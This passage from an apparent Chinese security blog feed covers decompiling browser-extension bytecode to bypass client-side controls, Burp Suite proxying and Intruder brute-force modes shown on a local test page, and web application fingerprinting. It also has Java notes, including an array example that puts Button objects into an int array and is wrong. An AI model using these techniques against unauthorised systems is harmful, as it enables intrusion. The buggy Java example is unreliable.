string">"CheckQuantity.class"</span> codebase<span class="token operator">=</span><span class="token string">"/scripts"</span> id<span class="token operator">=</span><span class="token string">"CheckQuantityApplet"</span><span class="token operator">></span><span class="token operator">&lt;</span>/applet<span class="token operator">></span></code></pre><p>某些情况下，加载字节码的URL可能并不明显，因为组件可能使用不同浏览器扩展框架提供的各种包装脚本(wrapper script)进行加载。确定字节码的另一种方法，是在浏览器加载浏览器扩展后，在代理服务器历史记录中查找该URL</p><h5 id="反编译字节码"><a href="#反编译字节码" class="headerlink" title="反编译字节码"></a>反编译字节码</h5><ul><li>字节码通常以独立文件包的形式发布，可能需要进行解压缩才能获得单个字节码文件，然后将其反编译为源代码。</li><li>正常情况下，java applet打包成.jar(java档案)文件，Silverlight对象打包成.xap文件。这两种文件均使用zip档案格式。</li><li>因此，只需用.zip扩展名重命名这些文件，然后用任何.zip读取器就可以将它们解压缩成单个的文件</li><li>Java字节码包含在.class文件中，Silverlight字节码包含在.dll文件中。</li><li>　解压缩相关文件包后，需要反编译这些文件才能获得源代码</li></ul><blockquote><p>注：Flash对象打包成.swf文件，在使用反编译器之前，不需要对这类文件进行压缩处理</p></blockquote><p>反编译字节码工具：</p><ul><li>java工具：Java字节码可以使用Jad(Java反编译器)的工具反编译成Java源代码</li><li>Flash工具：Flash可以反编译成ActionScript源代码。另一种更有效的方法，是将字节码反编译成人类可读的格式，而不是将其完全反编译成源代码</li><li>Silverlight工具：Silverlight字节码可以使用一种称为.NET Reflector的工具反编译成源代码</li></ul><h5 id="分析源代码"><a href="#分析源代码" class="headerlink" title="分析源代码"></a>分析源代码</h5><p>以下是需要寻找的一些项目：</p><ul><li>在客户端发送的输入或其他安全相关逻辑和事件</li><li>在向服务器传送数据之前用于包装用户提交的数据的模糊或加密程序</li><li>在用户界面中不可见，但可以通过修改组件进行解锁的“隐藏的”客户端功能</li><li>对以前未通过解析应用程序确定的服务器端功能的引用</li></ul><ol><li>在浏览器中重新编译执行<br>要改变组件的行为，可以对反编译得到的源代码进行修改，重新将其编译成字节码，然后在浏览器中执行修改后的组件。可采用的工具如下：</li></ol><ul><li>java:使用JDK中的javac程序重新编译修改后的源代码</li><li>Flash:使用flasm重新汇编修改后的字节码，或使用Adode的某个Flash开发套件重新编译修改后的ActionScript源代码</li><li>Silverlight：使用Visual Studio 重新编译源代码</li></ul><blockquote><p>注：对于Java和Silverlight，需要用修改后的字节码文件替换已解压的档案中的文件，使用zip实用程度重新压缩这些文件，然后根据需要将文件扩展名改为.jar或.xap</p></blockquote><p>最后需要将修改后的组件加载到浏览器中</p><ol start="2"><li><p>在浏览器以外重新编译并执行<br>有时可以使用代理服务器在原始组件提交经过确认的输入时拦截相关请求，并用修改后的组件输出的值替换这些请求。要实施这种攻击，需要对在相关浏览器扩展中运行的原始可执行文件进行修改，将其更改为可以在命令行中运行的独立程序。</p></li><li><p>使用JavaScript操纵原始组件<br>可以通过修过HTML页面中与组件交互的JavaScript来达到目的。通过查看组件的源代码，可以确定组件的所有可直接从JavaScript调用的公共方法，以及组件处理这些方法的参数的方式。 </p></li></ol><h5 id="字节码模糊处理"><a href="#字节码模糊处理" class="headerlink" title="字节码模糊处理"></a>字节码模糊处理</h5><p>经过模糊处理的字节码更难反编译，常用的模糊处理技巧如下：</p><ul><li>用没有意义的表达式(如a、b、c)代替有意义的类、方法和成员变量名称</li><li>用new、int之类的保留关键字代替项目名称。</li><li>许多模糊处理工具删除字节码中不必要的调试和元信息，包括源文件名和行号(使栈追踪缺乏信息)、局部变量名称(使调试更麻烦)和内部类信息(使反射无法正常进行)</li><li>增加多余代码，以看似有用的方式建立并处理各种数据</li><li>使用跳转命令(jump instruction)对整个代码的执行路径进行修改，致使攻击者无法判别源代码的逻辑执行顺序</li><li>引用非法的编程结构，如无法到达的语句和缺少return语句的代码路径</li></ul><h3 id="附加调试器"><a href="#附加调试器" class="headerlink" title="附加调试器"></a>附加调试器</h3><p>由于调试器在字节码级别运行，因此，可以使用调试器轻松控制并了解组件的执行过程。JavaSnoop是一款Java调试器，它能够与Jad集成，以用于反编译源代码、在应用程序中跟踪变量，并在方法中设置断点来查看和修改参数。</p><h3 id="本地客户端组件"><a href="#本地客户端组件" class="headerlink" title="本地客户端组件"></a>本地客户端组件</h3><p>一些应用程序需要在用户计算机中执行基于浏览器的VM沙盒内无法执行的操作。以下是这些功能的示例:</p><ul><li>验证用户是否装有最新的病毒扫描器</li><li>验证代理服务器设置及其他企业配置是否有效</li><li>集成智能卡读取器</li></ul><p>本地客户端组件一般通过ActiveX控件传送，ActiveX控件是在浏览器沙盒以外运行的定制浏览器扩展。由于没有对于的中间字节码，解译本地客户端组件要困难得多，但是，我们在避开客户端控件时采用的方法对本地客户端组件仍然适用。以下是一些工具介绍：</p><ul><li>OllyDbg是一个可用于遍历本地可执行代码、设置断点，并在磁盘上或在运行时对可执行文件应用补丁的Windows调试器</li><li>IDA Pro是一个反汇编程序，它可以将大量的平台上的本地可执行代码反汇编成人类可读的汇编代码</li></ul><h2 id="安全处理客户端数据"><a href="#安全处理客户端数据" class="headerlink" title="安全处理客户端数据"></a>安全处理客户端数据</h2><p>由于客户端组件和用户输入不在服务器的直接控制范围内，所以客户端及其提交的所有数据本质上讲都不值得信任。</p><h3 id="通过客户端传送数据-1"><a href="#通过客户端传送数据-1" class="headerlink" title="通过客户端传送数据"></a>通过客户端传送数据</h3><ul><li>如果可能，应尽量避免从客户端传送重要数据，可以将这些数据保存在服务器上，并在必要时通过服务器端逻辑直接引用。(例如购物程序中，用户可以向服务器提交产品代码和数量，产品价格则可以通过服务器端数据库进行查询，而不需要用户从客户端提交)</li><li>如果只有通过客户端传送重要数据才能达到目的，应当对数据进行签名/加密处理以防止用户篡改，但是这种操作还必须避免两个重要的威胁：</li></ul><ol><li>签名或加密数据易受到重传攻击(reply attack)</li><li>如果用户知道或能控制送交给他们的加密字符串的明文值，那么他们就可以实施各种密码攻击，找出服务器使用的加密密钥</li></ol><h3 id="确认客户端生成的数据"><a href="#确认客户端生成的数据" class="headerlink" title="确认客户端生成的数据"></a>确认客户端生成的数据</h3><p>从理论上讲，客户端无法安全确认由客户端生成并且向服务器传送的数据。确认客户端生成数据的唯一安全方法是在应用程序的服务器端实施保护。客户端提交的每一项数据都应被视为危险和潜在恶意的。</p><h3 id="日志和警报"><a href="#日志和警报" class="headerlink" title="日志和警报"></a>日志和警报</h3><p>虽然应用程序采用长度限制和基于JavaScript的确认之类的机制来提高性能与可用性，但这些机制应与服务器端侵入检测防御工具组合使用，对客户端提交的数据进行确认的服务器端逻辑应认识到，客户端也采用了同样的确认机制。如果服务器端收到已被客户端阻止的数据，应用程序可能会据此推断，一名用户正设法避开这种确认，因此这些数据可能是恶意的，应用程序应将异常记录到日志中，适当情况下向应用程序管理员发出实时警报，终止用户会话或者暂时冻结其账户。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java</title>
      <link href="/2019/10/22/java1/"/>
      <url>/2019/10/22/java1/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是引用"><a href="#什么是引用" class="headerlink" title="什么是引用"></a>什么是引用</h2><ul><li><p>java8种基本类型：byte/short/int/long/float/double/char/boolean</p></li><li><p>不属于8种基本类型的所有类型都是引用类型(reference type)，引用类型包括的主要实体有字符串、数组和文件流</p></li><li><p>引用变量如下:</p></li><li><p>java不允许引用基本变量(基本变量即数据类型为8种基本类型的变量)</p></li><li><p>引用变量只存储地址</p></li></ul><h2 id="对象和引用基础"><a href="#对象和引用基础" class="headerlink" title="对象和引用基础"></a>对象和引用基础</h2><ul><li>在Java中，对象是任何非基本类型的实例。</li><li>基本类型的处理是按值的，即基本变量的假定值就存储在这些变量中，在赋值过程中，是从基本变量复制到基本变量。</li><li>引用变量存储的是对变量的引用(变量存储的地址)，实际对象存储在内存的某处，而引用变量存储对象的内存地址</li><li>引用变量与基本变量的行为是不同的<br><img src="https://i.postimg.cc/wTLzSF62/2.png" alt=""></li></ul><h3 id="点-运算符"><a href="#点-运算符" class="headerlink" title="点(.)运算符"></a>点(.)运算符</h3><p>点运算符用于选择用于对象的方法。</p><pre class=" language-bash"><code class="language-bash">double theArea <span class="token operator">=</span> theCircle.area<span class="token punctuation">(</span><span class="token punctuation">)</span>    //area是theCircle对象的一个方法，用于计算面积，并将存储在double类型的theArea变量中</code></pre><blockquote><p>注：theCircle可能存储着null引用(即所存地址不指向任何对象的地址),这种情况下，应用点运算符将会产生NullPointerException错误，导致异常终止</p></blockquote><h3 id="对象的声明"><a href="#对象的声明" class="headerlink" title="对象的声明"></a>对象的声明</h3><p>当声明引用变量时，只是提供一个名称，名称用来引用存储在内存中的对象</p><pre class=" language-bash"><code class="language-bash">Button b<span class="token punctuation">;</span>  //声明一个Button类型的引用变量b，此时存储在b中的值为nullb.setLable<span class="token punctuation">(</span><span class="token string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //error,此行代码在试图改变不存在的对象 </code></pre><p>分配对象唯一的常用方式是new</p><pre class=" language-bash"><code class="language-bash">Button b<span class="token punctuation">;</span>  //b是一个Button类型的引用对象，Button对象可以通过b引用b <span class="token operator">=</span> new Button<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //创建新对象，b引用已分配的对象b.setLable<span class="token punctuation">(</span><span class="token string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //将b的标签设为<span class="token string">"NO"</span></code></pre><p>也可以将声明和创建对象结合在一起</p><pre class=" language-bash"><code class="language-bash">Button b <span class="token operator">=</span> new Button<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="垃圾回收-garbage-collection"><a href="#垃圾回收-garbage-collection" class="headerlink" title="垃圾回收(garbage collection)"></a>垃圾回收(garbage collection)</h3><ul><li>在java中，当创建的对象不再被任何对象变量引用时，会自动回收这些对象占用的内存</li><li>java虚拟机保证，一旦通过引用链无法访问一些对象，而运行时系统(java虚拟机)判断可用内存不足，那么会回收这些对象的内存</li></ul><h3 id="的含义"><a href="#的含义" class="headerlink" title="=的含义"></a>=的含义</h3><pre class=" language-bash"><code class="language-bash">a <span class="token operator">=</span> b<span class="token punctuation">;</span></code></pre><ul><li>若ab为基本变量：将b的值复制到a里，随后对a或b进行操作对彼此都没有影响</li><li>若ab为引用变量：将b里存储的地址复制给a(即ab指向相同的对象)，随后对a或b的操作对彼此都有影响</li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>假设需要两个Button对象，通过创建noButton得到第一个对象，然后修改noButton来创建yesButton</p><pre class=" language-bash"><code class="language-bash">Button noButton <span class="token operator">=</span> new Button<span class="token punctuation">(</span><span class="token string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Button yesButton <span class="token operator">=</span> noButton<span class="token punctuation">;</span> //yesButton只是上一行创建对象的另一个名称yesButton.setLable<span class="token punctuation">(</span><span class="token string">"YES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //将拥有两个名称<span class="token punctuation">(</span>yesButton/noButton<span class="token punctuation">)</span>的对象标签值改为YES</code></pre><blockquote><p>注：对于对象来说，=是引用赋值不是对象复制，对象复制是要clone方法</p></blockquote><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="声明、赋值和方法"><a href="#声明、赋值和方法" class="headerlink" title="声明、赋值和方法"></a>声明、赋值和方法</h3><h4 id="数组的声明"><a href="#数组的声明" class="headerlink" title="数组的声明"></a>数组的声明</h4><pre class=" language-bash"><code class="language-bash">int <span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">;</span> array <span class="token operator">=</span> new int <span class="token punctuation">[</span>100<span class="token punctuation">]</span><span class="token punctuation">;</span>for<span class="token punctuation">(</span>int i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>array.length<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>    array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> new Button<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite使用教程</title>
      <link href="/2019/10/18/burp/"/>
      <url>/2019/10/18/burp/</url>
      
        <content type="html"><![CDATA[<h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p>是Web测试集成测试套件，只能抓取HTTP/HTTPS的数据包</p><h2 id="Proxy-拦截代理服务器"><a href="#Proxy-拦截代理服务器" class="headerlink" title="Proxy 拦截代理服务器"></a>Proxy 拦截代理服务器</h2><ul><li>拦截代理服务器是Burp Suite的核心</li><li>要拦截代理服务器，必须配置浏览器，将它的代理服务器作为本地机器上的一个端口，同时配置Burp Suite监听这个端口并接收由浏览器发布的所有请求</li><li>由于代理服务器能够访问浏览器与，目标Web服务器之间的双向通信，因而它能够拦截它们之间传送的每一条信息</li></ul><h3 id="Burp-Suite-配置"><a href="#Burp-Suite-配置" class="headerlink" title="Burp Suite 配置"></a>Burp Suite 配置</h3><p><img src="https://ae01.alicdn.com/kf/H1d16f8f9bd3441cd8bf411121e8d0b42S.jpg" alt=""><br><img src="https://ae01.alicdn.com/kf/H1bc78f8774dd4d788b8910089a2985dce.jpg" alt=""><br>对Burp Suite的端口和IP地址进行配置，注意不要使用已被占用的端口号</p><h3 id="浏览器配置"><a href="#浏览器配置" class="headerlink" title="浏览器配置"></a>浏览器配置</h3><p><img src="https://ae01.alicdn.com/kf/Hdebe9034334e49db8360fffffa91b68aV.jpg" alt=""><br>根据对Burp Suite的配置来配置浏览器(博主采用的是firefox浏览器)</p><h4 id="处理不支持代理的客户端"><a href="#处理不支持代理的客户端" class="headerlink" title="处理不支持代理的客户端"></a>处理不支持代理的客户端</h4><ol><li>修改操作系统hosts文件，将应用程序使用的主机名解析为测试员自己的回环地址(127.0.0.1)</li><li>对于应用程序使用的每个目标端口(通常是80和443端口)，在回环接口的这些端口上配置一个Burp Suite监听器，并将该监听器设置为支持匿名代理。匿名代理功能指监听器将接受厚客户端发送的非代理类型的请求</li><li>匿名模式代理仅支持HTTP/HTTPS请求，为防止SSL遇到致命的证书错误，可能需要将匿名代理监听器配置为显示包含厚客户端期望的特定主机名的SSL证书</li></ol><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p><img src="https://ae01.alicdn.com/kf/Hf5bcb1ba37d14a7ca937da37ec4ef076g.jpg" alt=""><br>保证Burp Suite进入代理状态<br><img src="https://ae01.alicdn.com/kf/H7de3a6c29f0242cb9e491a63b9962e5bb.jpg" alt=""><br>在浏览器中搜索<a href="http://www.baidu.com显示左侧界面，证明该请求被Burp" target="_blank" rel="noopener">www.baidu.com显示左侧界面，证明该请求被Burp</a> Suite拦截<br><img src="https://ae01.alicdn.com/kf/Hf96833a5950b4b10ace89863cbd43f58q.jpg" alt=""></p><h3 id="设置拦截HTTP-response"><a href="#设置拦截HTTP-response" class="headerlink" title="设置拦截HTTP response"></a>设置拦截HTTP response</h3><p><img src="https://ae01.alicdn.com/kf/He8da1cc1c0b744c999b62ac21934f8dfN.jpg" alt=""></p><h2 id="下载CA证书"><a href="#下载CA证书" class="headerlink" title="下载CA证书"></a>下载CA证书</h2><h3 id="下载CA"><a href="#下载CA" class="headerlink" title="下载CA"></a>下载CA</h3><p>如果要让Burp Suite抓到HTTPS包，需要Burp Suite拥有CA证书<br>在浏览器中搜索<a href="http://burp" target="_blank" rel="noopener">http://burp</a></p><p><img src="https://i.postimg.cc/wxSHfnd3/7.png" alt=""><br>点击CA进行下载</p><blockquote><p>注：此浏览器必须开了127.0.0.1:8080代理</p></blockquote><h3 id="导入CA"><a href="#导入CA" class="headerlink" title="导入CA"></a>导入CA</h3><p><img src="https://ae01.alicdn.com/kf/H62c0decac9bb4840a37b34cd10d212d4I.jpg" alt=""><br>点击下一步导入CA证书</p><h3 id="在浏览器添加信任"><a href="#在浏览器添加信任" class="headerlink" title="在浏览器添加信任"></a>在浏览器添加信任</h3><p>在浏览器选项中找到证书，导入CA证书，选择信任该证书</p><h3 id="可能会出现的错误"><a href="#可能会出现的错误" class="headerlink" title="可能会出现的错误"></a>可能会出现的错误</h3><ul><li>出现SSL_ERROR_RX_RECORD_TOO_LONG 错误</li></ul><ol><li>在Firefox的地址栏中输入“ about:config ”。</li><li>在搜索条目“tls.version.max ”。将值从4更改为3。</li><li>值4所表示TLS 1.3，3个代表TLS 1.2。</li></ol><h2 id="Target目标"><a href="#Target目标" class="headerlink" title="Target目标"></a>Target目标</h2><p>将进行渗透测试的目标列出来，目录爬行结果呈现</p><h2 id="Spider-爬虫"><a href="#Spider-爬虫" class="headerlink" title="Spider 爬虫"></a>Spider 爬虫</h2><p>Web爬虫工作机制：</p><ul><li>请求Web页面，解析这些页面，从中找出指向其他页面的链接，然后向它们提出请求</li><li>继续执行上述过程，直到查明一个网站的全部内容</li></ul><h2 id="Intruder暴力破解"><a href="#Intruder暴力破解" class="headerlink" title="Intruder暴力破解"></a>Intruder暴力破解</h2><p>有效负载：有效负载是被传输数据中的一部分，而这部分才是数据传输的最基本的目的，和有效负载一同被传送的数据还有：数据头或称作元数据，有时候也被称为开销数据，这些数据用来辅助数据传输。(解释来源百度百科)</p><h3 id="target选项"><a href="#target选项" class="headerlink" title="target选项"></a>target选项</h3><p>用于配置进行攻击的目标服务器的详细信息<br><img src="https://ae01.alicdn.com/kf/H22227af60f634f30bada3047e6b22ba1V.jpg" alt=""></p><h3 id="position选项"><a href="#position选项" class="headerlink" title="position选项"></a>position选项</h3><p>用于配置在攻击里产生的所有HTTP请求的模板<br><img src="https://ae01.alicdn.com/kf/H4d85b98584bf4f9aae5beb1bc47810314.png" alt=""></p><h4 id="Sniper阻击手模式"><a href="#Sniper阻击手模式" class="headerlink" title="Sniper阻击手模式"></a>Sniper阻击手模式</h4><p>适用于单一的目标参数破解</p><p>已知用户名username，只需要暴力破解password。只需要给一个字典，就可以进行测试，<br>假如给定的密码为[a,b,c,d]:则破解方式为<br>password：<br>a<br>b<br>c<br>d</p><blockquote><p>注：字典是给定进行暴力破解的参数的文件，如上述[a,b,c,d]就是字典</p></blockquote><h4 id="Battering-ram撞击模式"><a href="#Battering-ram撞击模式" class="headerlink" title="Battering ram撞击模式"></a>Battering ram撞击模式</h4><p>不管多少参数，只用一个字典</p><p>假如有两个目标参数需要破解,Intruder将密码字典中的密码同时给两个目标<br>假如给定的字典为[a,b,c,d],则破解方式为：<br>username |password<br>a        |a<br>b        |b<br>c        |c<br>d        |d</p><h4 id="Pitchfork交叉模式"><a href="#Pitchfork交叉模式" class="headerlink" title="Pitchfork交叉模式"></a>Pitchfork交叉模式</h4><p>有多少个参数就有多少个字典</p><p>本次爆破有两个目标,给出的两个字典分别是[1,2]和[a,b]<br>则破解方式为：<br>username  |password<br>1         |a<br>2         |b</p><h4 id="Cluster-bomp急速炸弹模式"><a href="#Cluster-bomp急速炸弹模式" class="headerlink" title="Cluster bomp急速炸弹模式"></a>Cluster bomp急速炸弹模式</h4><p>本次爆破有两个目标，给定两个字典之后，产生的攻击效果是进行笛卡尔积<br>给定的两个字典分别为[1,2]和[a,b,c,d]<br>则破解方式为：<br>username|password<br>1        |a<br>1        |b<br>1        |c<br>1        |d<br>2        |a<br>2        |b<br>2        |c<br>2        |d</p><h3 id="实例讲解"><a href="#实例讲解" class="headerlink" title="实例讲解"></a>实例讲解</h3><p>利用phpStudy(详情请参考本博客phpStudy)搭建网站后，在网站文件夹中加入test.php文件，文件内容如下</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?<span class="token variable">$a</span> <span class="token operator">=</span><span class="token string">'nice'</span><span class="token punctuation">;</span><span class="token variable">$get</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"yes"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span></code></pre><p>设置target选项<br><img src="https://ae01.alicdn.com/kf/Haf24034a39a44048826c20c5bac3f657u.jpg" alt=""><br>开启Burp Suite的Proxy功能，在开启代理的浏览器搜索栏中输入 <font color="#fb8c00"><a href="http://www.test.com/test.php?a=1" target="_blank" rel="noopener">www.test.com/test.php?a=1</a></font><br>捕获得如下数据包<br><img src="https://ae01.alicdn.com/kf/H3b7ff248abe14326b512ce5b3c9f9b91Q.jpg" alt=""><br>点击Action选择Send to intruder将数据包送至intruder模块，鼠标选中需要暴力破解的地方，点击Add$,如图<br><img src="https://ae01.alicdn.com/kf/Ha6ec2d1d936c46269baf25c27efbcb74X.jpg" alt=""></p><p>simple list模式：手动添加字典值<br><img src="https://ae01.alicdn.com/kf/H35c74ae70eaa471b9e3c4585de49819c8.jpg" alt=""><br>运行结果如下：<br><img src="https://ae01.alicdn.com/kf/Hf2ad34cb98034bb8b829dd42f796e51fe.jpg" alt=""></p><p>Runtime file模式：导入外部文件作为字典<br>新建txt文件(该文件路径不允许有中文字)<br><img src="https://ae01.alicdn.com/kf/H55098e16197d4974ba9e0d8fdde262c0B.jpg" alt=""><br><img src="https://ae01.alicdn.com/kf/H04c4c0a763194618a60069bc152697bfU.jpg" alt=""><br>运行结果<br><img src="https://ae01.alicdn.com/kf/H3578a4e5f47b40d096d19c80ecb7afc7F.jpg" alt=""></p><h2 id="Sequencer定序器"><a href="#Sequencer定序器" class="headerlink" title="Sequencer定序器"></a>Sequencer定序器</h2><h3 id="测试原理"><a href="#测试原理" class="headerlink" title="测试原理"></a>测试原理</h3><ul><li>首先，假设令牌是随机生成的</li><li>进行一系列测试，通过每个测试观察可能具有某些特征的令牌样本(如果令牌是随机生成的)的特定属性</li><li>对于每个测试，假定以上假设是正确的，计算观察到的特征发生的几率</li><li>如果该几率在某个水平(显著性水平)之下，则否定上述假设，并得出结论——令牌不是随机生成的。</li></ul><h3 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h3><p>开启proxy功能，在HTTP History中寻找类似Token或类似参数，选择Action中的send to sequencer。<br>点击配置，如图<br><img src="https://ae01.alicdn.com/kf/Hb67f34b3b29a4beea0c7abcf7305a53f5.jpg" alt=""><br>选中令牌部分，点击OK<br><img src="https://ae01.alicdn.com/kf/H164e6bdeea74463c8505bbb5b3a6dc5al.jpg" alt=""><br>开始进行随机分析<br><img src="https://ae01.alicdn.com/kf/H001bf5cb2d45475ba7a5ec0a4961e1d3q.jpg" alt=""><br>中间可以点击[pause]/[stop]暂停或停止，然后点击analyze now开始分析(抓取参数值不要小于100)<br><img src="https://ae01.alicdn.com/kf/H89bc2eaafa414abe886476394099eb78A.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(3)</title>
      <link href="/2019/10/18/websecurity3/"/>
      <url>/2019/10/18/websecurity3/</url>
      
        <content type="html"><![CDATA[<h2 id="解析应用程序"><a href="#解析应用程序" class="headerlink" title="解析应用程序"></a>解析应用程序</h2><p>博主采用Burp Suite实现</p><ul><li>攻击应用程序的第一步就是收集和分析与其有关的一些关键信息，以清楚了解攻击目标。</li><li>解析过程首先是枚举应用程序的内容与功能，从而了解应用程序的实际功能与运行机制</li><li>列出应用程序的功能后，接下来的首要任务就是仔细分析应用程序运行机制的每一个方面、核心安全机制及其(在客户端和服务器)使用的技术，确定应用程序暴露的主要攻击面并因此确定随后探查过程的主要目标。进而发现可供利用的漏洞。</li></ul><h2 id="枚举内容和功能"><a href="#枚举内容和功能" class="headerlink" title="枚举内容和功能"></a>枚举内容和功能</h2><p>通常，手动浏览即可确定应用程序的绝大部分内容与功能。浏览应用程序的基本方法是从主初始页面开始，然后是每一个链接和所有多阶段功能(如用户注册或密码重置)，但是为了全面记录每一项确定的功能，我们必须使用一些更加先进的技术</p><h3 id="Web抓取"><a href="#Web抓取" class="headerlink" title="Web抓取"></a>Web抓取</h3><p>我们可以使用各种工具自动抓取Web站点的内容。这些工具首先请求一个Web页面，对其进行分析，查找连接到其他内容的链接，然后请求这些内容，再继续进行循环，直到找不到新的内容为止。</p><h2 id="分析应用程序"><a href="#分析应用程序" class="headerlink" title="分析应用程序"></a>分析应用程序</h2><h3 id="确定用户输入入口点"><a href="#确定用户输入入口点" class="headerlink" title="确定用户输入入口点"></a>确定用户输入入口点</h3><p>在检查枚举应用程序功能时生成的HTTP请求的过程中，可以确定应用程序获取用户输入的绝大部分位置，需要注意的关键位置包括：</p><ul><li>每个URL字符串，包括查询字符串标记</li><li>URL查询字符串中提交的每个参数</li><li>POST请求主体中提交的每个参数</li><li>每个cookie</li><li>极少情况下可能包括由应用程序处理的其他所有HTTP消息头，特别是User-Agent,Referer,Accept,Accept-Language和Host消息头等</li></ul><h4 id="URL文件路径"><a href="#URL文件路径" class="headerlink" title="URL文件路径"></a>URL文件路径</h4><p>查询字符串之前的URL部分并不被视为是进入点，因为人们认为它只是服务器文件系统上的目录和文件名称。但是，在使用RSET风格的URL的应用程序中，查询字符串之前的URL部分实际上可以作为数据参数，并且和进入点一样重要，因为用户输入就是查询字符串本身。</p><pre class=" language-bash"><code class="language-bash">http://eis/shop/browse/electronics/iPhone3G   //典型的REST风格的URL</code></pre><p>在上述的示例中，electronics和iPhone3G应被视为存储搜索功能的参数</p><h4 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h4><p>多数情况下，在URL查询字符串、消息主体和HTTP cookie中提交的参数都是明显的用户输入进入点，但是，一些应用程序并不对这些参数使用标准的name=value的格式，而是使用定制的方案。定制方案采用非标准查询字符串标记和字段分隔符，甚至可能在参数数据中嵌入其他数据方案(如XML)，以下是一些非标准参数格式的实例:</p><pre class=" language-bash"><code class="language-bash">/dir/file<span class="token punctuation">;</span>foo<span class="token operator">=</span>bar<span class="token operator">&amp;</span>foo2<span class="token operator">=</span>bar2<span class="token punctuation">;</span>/dir/file?foo<span class="token operator">=</span>bar<span class="token variable">$foo2</span><span class="token operator">=</span>bar2<span class="token punctuation">;</span>/dir/file/foo%3dbar%26foo2%3dbar2<span class="token punctuation">;</span>dir/foo.bar/file<span class="token punctuation">;</span>/dir/file?param<span class="token operator">=</span>foo:bar<span class="token punctuation">;</span>/dir/file?data<span class="token operator">=</span>%3cfoo%3ebar%3c%2ffoo%3e%3cfoo2%3ebar2%3c%2ffoo2%3e</code></pre><h4 id="消息头"><a href="#消息头" class="headerlink" title="消息头"></a>消息头</h4><p>许多应用程序执行定制的日志功能，并可能会记录HTTP信息头(如Referer和User-Agent)的内容，应始终将这些消息头视为基于输入的攻击的可能进入点</p><h4 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h4><p>应用程序通过带外通道接收攻击者能够控制的数据</p><h3 id="确定服务器端技术"><a href="#确定服务器端技术" class="headerlink" title="确定服务器端技术"></a>确定服务器端技术</h3><h4 id="提取版本信息"><a href="#提取版本信息" class="headerlink" title="提取版本信息"></a>提取版本信息</h4><p>许多Web服务器公开与Web服务器软件本身和所安装的组件有关的详细版本信息。例如，HTTP Server消息头揭示大量与安装软件有关的详细版本信息。可能揭露与软件类型和版本有关信息的位置：</p><ul><li>HTTP Server消息头</li><li>建立HTML页面的模板</li><li>定制的HTTP消息头</li><li>URL查询字符串参数</li></ul><h4 id="HTTP指纹识别"><a href="#HTTP指纹识别" class="headerlink" title="HTTP指纹识别"></a>HTTP指纹识别</h4><ul><li>大多数应用程序的服务器软件允许管理员配置在ServerHTTP消息头中返回的旗标。，但是攻击者仍然可以利用Web服务器的其他行为确定其所使用的软件，或缩小搜索范围</li><li>HTTP规范中包含许多可选或由执行者自行决定是否使用的内容，许多Web服务器还以各种不同的方式违背或扩展该规范，因此除了Server消息头以外，还有大量迂回的方法可以用来识别Web服务器(比如Httprecon对应用程序进行扫描)</li></ul><h4 id="文件扩展名"><a href="#文件扩展名" class="headerlink" title="文件扩展名"></a>文件扩展名</h4><p>URL中使用的文件扩展名往往能够揭示应用程序执行相关功能所使用的平台或语言。</p><pre class=" language-bash"><code class="language-bash">asp--Microsoft Active Server Pagesaspx--Microsoft ASP.NETjsp--java Server Pages</code></pre><p>即使应用程序在它公布内容中并不使用特定的文件扩展名，但我们还是能够确定服务器是否执行支持该扩展名的技术。例如，如果应用程序上安装有ASP.NET，请求一个不存在aspx文件将返回一个由ASP.NET框架生成的错误页面，但是，请求一个扩展名不同的不存在的文件将返回一个由Web服务器生成的常规错误消息。之所以出现上述不同的行为，是因为许多Web服务器将特殊的文件扩展名映射到特定的服务器端组件中，不同的组件处理错误的方式给不相同。</p><h4 id="目录名称"><a href="#目录名称" class="headerlink" title="目录名称"></a>目录名称</h4><p>一些子目录名称常常表示应用程序使用了相关的技术,如：</p><pre class=" language-bash"><code class="language-bash">servlet--Java servletpls--Oracle Application Server PL/SQL网关</code></pre><h4 id="会话令牌"><a href="#会话令牌" class="headerlink" 